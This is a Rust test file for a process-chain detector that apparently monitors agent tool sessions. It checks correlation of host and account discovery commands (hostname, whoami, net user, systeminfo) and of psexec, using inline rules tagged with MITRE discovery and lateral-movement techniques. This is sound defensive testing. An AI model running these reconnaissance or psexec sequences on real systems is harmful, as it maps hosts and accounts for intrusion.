    let evaluation = evaluate_tool_process_chain_session(
        &rules,
        &[&hostname, &account],
        &ProcessChainContext::default(),
        &ProcessChainSessionConfig::default(),
    )
    .unwrap();
    assert!(
        evaluation
            .results()
            .iter()
            .all(|result| !result.detector().id().starts_with("procchain.correlation."))
    );
}

#[test]
fn shipped_any_child_correlation_uses_private_child_context() {
    let rules = load_default_process_chain_rules().unwrap();
    let hostname = timed_command(
        "cmd.exe /c hostname",
        "any-child-hostname",
        Some("session:any-child"),
        Some("2026-09-17T10:00:00Z"),
    );
    let account = timed_command(
        "cmd.exe /c whoami",
        "any-child-account",
        Some("session:any-child"),
        Some("2026-09-17T10:01:00Z"),
    );
    let evaluation = evaluate_tool_process_chain_session(
        &rules,
        &[&hostname, &account],
        &ProcessChainContext::default(),
        &ProcessChainSessionConfig::default(),
    )
    .unwrap();
    let correlation = result(
        evaluation.results(),
        "procchain.correlation.host_then_account_discovery",
    );
    assert_eq!(correlation.finding_kind(), FindingKind::Correlation);
    assert_eq!(correlation.correlation_scope(), CorrelationScope::Sequence);
    assert_eq!(correlation.observation_ids().len(), 2);
    assert_eq!(
        correlation
            .observation_ids()
            .iter()
            .map(String::as_str)
            .collect::<BTreeSet<_>>(),
        [hostname.observation_id(), account.observation_id()]
            .into_iter()
            .collect::<BTreeSet<_>>()
    );
    let signal = correlation.signal().unwrap().unwrap();
    let finding = signal.finding().unwrap();
    assert_eq!(signal.observation_ids(), correlation.observation_ids());
    assert_eq!(finding.observation_ids(), correlation.observation_ids());
}

#[test]
fn one_tool_observation_preserves_command_order_for_correlation() {
    let rules = load_default_process_chain_rules().unwrap();
    let reversed = timed_command(
        "cmd.exe /c whoami && cmd.exe /c hostname",
        "same-observation-reversed",
        Some("s:reversed"),
        Some("2026-09-17T10:00:00Z"),
    );
    let reversed = evaluate_tool_process_chain_session(
        &rules,
        &[&reversed],
        &ProcessChainContext::default(),
        &ProcessChainSessionConfig::default(),
    )
    .unwrap();
    assert!(!reversed.results().iter().any(|result| {
        result.detector().id() == "procchain.correlation.host_then_account_discovery"
    }));

    let forward = timed_command(
        "cmd.exe /c hostname && cmd.exe /c whoami",
        "same-observation-forward",
        Some("s:forward"),
        Some("2026-09-17T10:00:00Z"),
    );
    let forward = evaluate_tool_process_chain_session(
        &rules,
        &[&forward],
        &ProcessChainContext::default(),
        &ProcessChainSessionConfig::default(),
    )
    .unwrap();
    assert!(forward.results().iter().any(|result| {
        result.detector().id() == "procchain.correlation.host_then_account_discovery"
    }));
}

#[test]
fn correlation_keeps_child_context_when_atomic_signal_identity_collapses() {
    let rules = load_process_chain_rules(
            r#"
version: 1
description: private child context
defaults: { enabled: true, risk_entity: host, suppression_window_seconds: 3600 }
categories:
  discovery: { detection_class: security_detection, analytic_intent: alert, investigation_fields: [], falsepositives: [] }
rules: []
standalone:
  - { id: procchain.synthetic.command, title: command, category: discovery, severity: informational, score: 0, confidence: low, match: command_line, patterns: ["\\b(hostname|whoami)\\b"], mitre: [T1082], reason: command }
correlations:
  - id: procchain.correlation.synthetic_children
    title: child sequence
    category: discovery
    severity: medium
    score: 45
    confidence: medium
    mitre: [T1082]
    reason: child sequence
    window_seconds: 60
    entity: host
    sequence:
      - { any_rule_id: [procchain.synthetic.command], any_child: [hostname] }
      - { any_rule_id: [procchain.synthetic.command], any_child: [whoami] }
"#,
        )
        .unwrap();
    let observation = timed_command(
        "cmd.exe /c hostname && cmd.exe /c whoami",
        "same-identity-children",
        Some("session:private-children"),
        Some("2026-09-17T10:00:00Z"),
    );
    let evaluation = evaluate_tool_process_chain_session(
        &rules,
        &[&observation],
        &ProcessChainContext::default(),
        &ProcessChainSessionConfig::default(),
    )
    .unwrap();

    assert_eq!(
        evaluation
            .results()
            .iter()
            .filter(|result| result.detector().id() == "procchain.synthetic.command")
            .count(),
        1,
        "outward atomic Signal identity remains unique"
    );
    assert_eq!(evaluation.suppressed_count(), 0);
    let correlation = result(
        evaluation.results(),
        "procchain.correlation.synthetic_children",
    );
    assert_eq!(
        correlation.observation_ids(),
        [observation.observation_id()]
    );
}

#[test]
fn correlation_omits_non_aggregate_capability_context() {
    let rules = load_default_process_chain_rules().unwrap();
    let hostname = tool_with_session_time_and_capability(
        ObservationStage::ToolRequested,
        Some("cmd.exe /c hostname"),
        None,
        None,
        "shell",
        "capability-hostname",
        Some("session:capability-context"),
        Some("2026-09-17T10:00:00Z"),
        CapabilityAvailability::Supported,
    );
    let account = tool_with_session_time_and_capability(
        ObservationStage::ToolRequested,
        Some("cmd.exe /c whoami"),
        None,
        None,
        "shell",
        "capability-account",
        Some("session:capability-context"),
        Some("2026-09-17T10:01:00Z"),
        CapabilityAvailability::Unknown,
    );
    let evaluation = evaluate_tool_process_chain_session(
        &rules,
        &[&hostname, &account],
        &ProcessChainContext::default(),
        &ProcessChainSessionConfig::default(),
    )
    .unwrap();
    let correlation = result(
        evaluation.results(),
        "procchain.correlation.host_then_account_discovery",
    );

    assert!(correlation.capability_context().is_none());
}

#[test]
fn category_and_rule_id_correlation_predicates_remain_compiled_authority() {
    let rules = load_process_chain_rules(
            r#"
version: 1
description: predicate coverage
defaults: { enabled: true, risk_entity: host, suppression_window_seconds: 3600 }
categories:
  discovery: { detection_class: security_detection, analytic_intent: alert, investigation_fields: [], falsepositives: [] }
  lateral_movement: { detection_class: security_detection, analytic_intent: alert, investigation_fields: [], falsepositives: [] }
rules:
  - { id: procchain.synthetic.first, title: first, category: discovery, severity: informational, score: 0, confidence: low, parent: cmd, child: hostname, mitre: [T1082], reason: first, dedup_key: synthetic:first }
  - { id: procchain.synthetic.second, title: second, category: lateral_movement, severity: high, score: 55, confidence: high, parent: cmd, child: psexec, mitre: [T1570], reason: second, dedup_key: synthetic:second }
standalone: []
correlations:
  - id: procchain.correlation.synthetic_predicates
    title: predicates
    category: lateral_movement
    severity: high
    score: 55
    confidence: high
    mitre: [T1570]
    reason: predicates
    window_seconds: 60
    entity: host
    sequence:
      - any_category: [discovery]
        any_rule_id: [procchain.synthetic.first]
      - any_category: [lateral_movement]
"#,
        )
        .unwrap();
    let first = timed_command(
        "cmd.exe /c hostname",
        "predicate-first",
        Some("session:predicate"),
        Some("2026-09-17T10:00:00Z"),
    );
    let second = timed_command(
        "cmd.exe /c psexec",
        "predicate-second",
        Some("session:predicate"),
        Some("2026-09-17T10:00:01Z"),
    );
    let evaluation = evaluate_tool_process_chain_session(
        &rules,
        &[&first, &second],
        &ProcessChainContext::default(),
        &ProcessChainSessionConfig::default(),
    )
    .unwrap();
    let correlation = result(
        evaluation.results(),
        "procchain.correlation.synthetic_predicates",
    );
    assert_eq!(correlation.risk_points(), Some(55));
    assert_eq!(correlation.techniques(), ["attack:T1570"]);
    assert!(
        evaluation
            .results()
            .iter()
            .any(|result| result.detector().id() == "procchain.synthetic.first")
    );
}

#[test]
fn correlation_window_and_throttle_are_session_scoped() {
    let rules = load_default_process_chain_rules().unwrap();
    let hostname = timed_command(
        "cmd.exe /c hostname",
        "window-hostname",
        Some("session:window"),
        Some("2026-09-17T10:00:00Z"),
    );
    let account = timed_command(
        "cmd.exe /c whoami",
        "window-account",
        Some("session:window"),
        Some("2026-09-17T10:16:00Z"),
    );
    let outside = evaluate_tool_process_chain_session(
        &rules,
        &[&hostname, &account],
        &ProcessChainContext::default(),
        &ProcessChainSessionConfig::default(),
    )
    .unwrap();
    assert!(!outside.results().iter().any(
        |result| result.detector().id() == "procchain.correlation.host_then_account_discovery"
    ));

    let first = timed_command(
        "cmd.exe /c hostname",
        "throttle-hostname-1",
        Some("session:throttle"),
        Some("2026-09-17T10:00:00Z"),
    );
    let first_account = timed_command(
        "cmd.exe /c whoami",
        "throttle-account-1",
        Some("session:throttle"),
        Some("2026-09-17T10:01:00Z"),
    );
    let second = timed_command(
        "cmd.exe /c systeminfo",
        "throttle-hostname-2",
        Some("session:throttle"),
        Some("2026-09-17T10:02:00Z"),
    );
    let second_account = timed_command(
        "cmd.exe /c net user",
        "throttle-account-2",
        Some("session:throttle"),
        Some("2026-09-17T10:03:00Z"),
    );
    let evaluation = evaluate_tool_process_chain_session(
        &rules,
        &[&first, &first_account, &second, &second_account],
        &ProcessChainContext::default(),
        &ProcessChainSessionConfig::default(),
    )
    .unwrap();
    assert_eq!(
        evaluation
            .results()
            .iter()
            .filter(|result| result.detector().id()
                == "procchain.correlation.host_then_account_discovery")
            .count(),
        1
    );
    let expanded = evaluate_tool_process_chain_session(
        &rules,
        &[&first, &first_account, &second, &second_account],
        &ProcessChainContext::default(),
        &ProcessChainSessionConfig {
            max_correlations_per_rule_entity: 2,
            ..Default::default()
        },
    )
    .unwrap();
    assert_eq!(
        expanded
            .results()
            .iter()
            .filter(|result| result.detector().id()
                == "procchain.correlation.host_then_account_discovery")
            .count(),
        2
    );
}

#[test]
fn risk_capped_correlation_remains_an_informational_process_chain_result() {
    let rules = load_process_chain_rules(
            r#"
version: 1
description: cap coverage
defaults: { enabled: true, risk_entity: host, suppression_window_seconds: 3600 }
categories:
  discovery: { detection_class: security_detection, analytic_intent: alert, investigation_fields: [], falsepositives: [] }
  lateral_movement: { detection_class: security_detection, analytic_intent: alert, investigation_fields: [], falsepositives: [] }
rules:
  - { id: procchain.synthetic.first, title: first, category: discovery, severity: medium, score: 45, confidence: high, parent: cmd, child: hostname, mitre: [T1082], reason: first, dedup_key: synthetic:first }
  - { id: procchain.synthetic.second, title: second, category: lateral_movement, severity: high, score: 55, confidence: high, parent: cmd, child: psexec, mitre: [T1570], reason: second, dedup_key: synthetic:second }
standalone: []
correlations:
  - { id: procchain.correlation.synthetic_first, title: first, category: discovery, severity: medium, score: 45, confidence: high, mitre: [T1082], reason: first, window_seconds: 60, entity: host, sequence: [{ any_category: [discovery] }, { any_category: [lateral_movement] }] }
  - { id: procchain.correlation.synthetic_second, title: second, category: lateral_movement, severity: high, score: 55, confidence: high, mitre: [T1570], reason: second, window_seconds: 60, entity: host, sequence: [{ any_category: [discovery] }, { any_category: [lateral_movement] }] }
"#,
        )
        .unwrap();
    let first = timed_command(
        "cmd.exe /c hostname",
        "cap-first",
        Some("session:cap"),
        Some("2026-09-17T10:00:00Z"),
    );
    let second = timed_command(
        "cmd.exe /c psexec",
        "cap-second",
        Some("session:cap"),
        Some("2026-09-17T10:01:00Z"),
    );
    let evaluation = evaluate_tool_process_chain_session(
        &rules,
        &[&first, &second],
        &ProcessChainContext::default(),
        &ProcessChainSessionConfig {
            max_correlation_risk_per_entity: 50,
            ..Default::default()
        },
    )
    .unwrap();
    let uncapped = result(
        evaluation.results(),
        "procchain.correlation.synthetic_first",
    );
    let capped = result(
        evaluation.results(),
        "procchain.correlation.synthetic_second",
    );
    assert_eq!(uncapped.risk_points(), Some(45));
    assert_eq!(capped.evaluation_status(), EvaluationStatus::EvaluatedMatch);
    assert_eq!(capped.risk_points(), Some(0));
    assert_eq!(capped.severity(), Severity::Informational);
    assert_eq!(capped.finding_kind(), FindingKind::Correlation);
    assert!(capped.tags().contains(&"risk_capped".to_owned()));
    assert_eq!(capped.confidence(), Some(Confidence::High));
    assert_eq!(capped.techniques(), ["attack:T1570"]);
    assert_eq!(capped.observation_ids().len(), 2);
}
